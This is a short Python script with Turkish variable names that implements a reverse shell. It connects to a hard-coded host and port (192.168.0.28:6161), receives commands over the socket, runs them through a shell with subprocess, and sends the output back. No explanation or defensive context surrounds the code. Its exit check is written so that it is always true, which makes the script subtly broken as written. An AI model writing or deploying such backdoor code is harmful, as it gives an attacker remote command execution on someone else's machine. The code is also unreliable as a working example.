import socket
import subprocess
port = 6161
ip = "192.168.0.28"
def yolla():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))

    while True:
        komut = s.recv(1024)

        if 'cikis' or 'exit' or 'finish' in komut:
            s.close()
            break
        else:
            komut_calistir = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            s.send(komut_calistir.stdout.read())
            s.send(komut_calistir.stderr.read())
yolla()

        
